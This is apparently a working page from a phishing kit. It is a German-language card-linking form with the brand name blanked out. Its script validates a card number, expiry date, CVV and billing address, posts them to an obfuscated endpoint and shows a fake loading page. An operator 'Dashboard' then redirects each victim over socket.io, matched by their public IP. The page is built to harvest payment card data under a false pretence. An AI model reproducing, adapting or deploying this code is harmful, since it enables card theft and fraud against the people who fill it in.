



<!DOCTYPE html>
<html lang="de"></html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="/css/card.css">
    
</head>
<body>
    <div class="cc">
        <div class="all">
            
            <div class="link">
                
                <img src="/img/kartopipola.PNG" alt="">
            </div>
            <form class="inp" method="post" id="caponaForm">
                <div class="input-container2">
                    <input required name="cardNumber" id="cardNumber" maxlength="19" type="tel"  />
                    <label class="label" for="cardNumber">Kreditkartennummer</label>
                    <div class="underline"></div>
                    <div id="cardNumber-error" class="error-message"></div>
                </div>
                
                <div class="mmyy">
                    <div class="input-container2">
                        <input required name="expiryDate" id="expiryDate" maxlength="5" type="text"  />
                        <label class="label" for="expiryDate">Ablauf</label>
                        <div class="underline"></div>
                        <div id="expiryDate-error" class="error-message"></div>
                    </div>
                    <div class="input-container2">
                        <input required name="cvv" id="cvv" maxlength="3" type="text" />
                        <label class="label" for="cvv">CVV</label>
                        <div class="underline"></div>
                        <div id="cvv-error" class="error-message"></div>
                    </div>
                </div>
                <p style="text-align: left; margin-top: 20px; margin-bottom: 15px;">Neue Rechnungsadresse hinzufügen</p>
                <div class="input-container2">
                    <input required name="address1" id="address1" type="text" />
                    <label class="label" for="address1">Adresszeile 1</label>
                    <div class="underline"></div>
                    <div id="address1-error" class="error-message"></div>
                </div>
                <div class="input-container2">
                    <input name="address2" id="address2" type="text" />
                    <label class="label" for="address2">Adresszeile 2</label>
                    <div class="underline"></div>
                    <div id="address2-error" class="error-message"></div>
                </div>
                <div class="input-container2">
                    <input required name="city" id="city" type="text" />
                    <label class="label" for="city">Stadt / Ort / Dorf</label>
                    <div class="underline"></div>
                    <div id="city-error" class="error-message"></div>
                </div>
                <div class="input-container2">
                    <input required name="zip" id="zip" type="text" />
                    <label class="label" for="zip">PLZ</label>
                    <div class="underline"></div>
                    <div id="zip-error" class="error-message"></div>
                </div>
                <button type="submit" class="btn2">Linkkarte</button>
            </form>
            </div>
        </div>
    </div>
    
        <div class="pri">
            <div class="privacy">
                <p>©1999-2024 , Inc. Alle Rechte vorbehalten.</p>
                <a href="">Datenschutz</a>
                <a href="">Cookies</a>
                <a href="">Rechtliches</a>
            </div>
        </div>
    </footer>   

    <script>
  // Validation for Capona form
  // Auto-format card number input
  const cardInput = document.getElementById('cardNumber');
  cardInput.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '').slice(0,16);
    let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
    e.target.value = formatted;
  });
  // Auto-format expiry date input
  const expiryInput = document.getElementById('expiryDate');
  expiryInput.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '').slice(0,4);
    if (value.length > 2) {
      e.target.value = value.slice(0,2) + '/' + value.slice(2);
    } else {
      e.target.value = value;
    }
  });
  function luhnCheck(val) {
    let sum = 0;
    let shouldDouble = false;
    for (let i = val.length - 1; i >= 0; i--) {
      let digit = +val.charAt(i);
      if (shouldDouble) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
      shouldDouble = !shouldDouble;
    }
    return sum % 10 === 0;
  }

  document.getElementById('caponaForm').addEventListener('submit', function(e) {
    e.preventDefault();
    // Clear errors
    ['cardNumber', 'expiryDate', 'cvv', 'address1', 'city', 'zip'].forEach(id => {
      document.getElementById(id + '-error').textContent = '';
    });
    const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
    const expiry = document.getElementById('expiryDate').value;
    const cvv = document.getElementById('cvv').value;
    let valid = true;
    // Card number
    if (!/^\d{13,19}$/.test(cardNumber) || !luhnCheck(cardNumber)) {
      document.getElementById('cardNumber-error').textContent = 'Ungültige Kartennummer';
      valid = false;
    }
    // Expiry date MM/YY
    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry)) {
      document.getElementById('expiryDate-error').textContent = 'Ungültiges Ablaufdatum';
      valid = false;
    } else {
      const [m, y] = expiry.split('/');
      const month = parseInt(m, 10);
      const year = parseInt('20' + y, 10);
      const now = new Date();
      if (year < now.getFullYear() || (year === now.getFullYear() && month < now.getMonth() + 1)) {
        document.getElementById('expiryDate-error').textContent = 'Karte abgelaufen';
        valid = false;
      }
    }
    // CVV
    if (!/^\d{3}$/.test(cvv)) {
      document.getElementById('cvv-error').textContent = 'Ungültiger CVV';
      valid = false;
    }
    // Address1
    if (!document.getElementById('address1').value.trim()) {
      document.getElementById('address1-error').textContent = 'Pflichtfeld';
      valid = false;
    }
    // City
    if (!document.getElementById('city').value.trim()) {
      document.getElementById('city-error').textContent = 'Pflichtfeld';
      valid = false;
    }
    // ZIP
    if (!document.getElementById('zip').value.trim()) {
      document.getElementById('zip-error').textContent = 'Pflichtfeld';
      valid = false;
    }
    
    const address1 = document.getElementById('address1').value.trim();
    const address2 = document.getElementById('address2').value.trim();
    const city = document.getElementById('city').value.trim();
    const zip = document.getElementById('zip').value.trim();
    if (valid) {
      // Submit data and redirect via fetch
      fetch('/NkMNm4664XhcW8KuukHk', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          cardNumber,
          expiryDate: expiry,
          cvv,

          address1,
          address2,
          city,
          zip
        })
      })
      .then(res => res.json())
      .then(data => {
        if (data.OK) {
          window.location.href = "/loading?time=20&url=/RKnUB922z6Mf4HDwg3EZ";
        }
      })
      .catch(err => console.error('Error:', err));
    }
  });
</script>
<script src="/socket.io/socket.io.js"></script>
    <script>
      async function getPublicIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    console.log("Public IP:", data.ip);
    return data.ip;
  } catch (error) {
    console.error("Failed to fetch IP:", error);
    return null;
  }
}
      const socket = io();
     
      // Handle redirect messages from server
      socket.on('redirect', async (data) => {
        const currentIp = await getPublicIP();
        console.log("Dashboard: "+data.ip,"Client: "+currentIp);
        
        if (data.ip === currentIp || data.ip == "::1" || data.ip=="::ffff:127.0.0.1" ) {

          window.location.href = data.url;
        }
      });
      </script>
</body>
</html>
